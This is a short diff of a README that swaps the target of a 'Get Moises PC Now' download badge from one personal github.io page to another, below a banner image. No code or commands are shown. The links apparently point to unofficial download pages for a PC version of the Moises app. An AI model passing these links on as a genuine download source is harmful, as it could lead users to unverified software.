@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://cdn-www.bluestacks.com/bs-images/featured_ai.moises.jpg)
 
-[![Get Moises PC Now](https://img.shields.io/badge/Get_Moises_PC-Now-0a5d8d?style=for-the-badge&logo=github)](https://liciousbonnie26.github.io/.github/moises-pc)
+[![Get Moises PC Now](https://img.shields.io/badge/Get_Moises_PC-Now-0a5d8d?style=for-the-badge&logo=github)](https://moises-pc-kit.github.io/.github/)
 
 ---
 
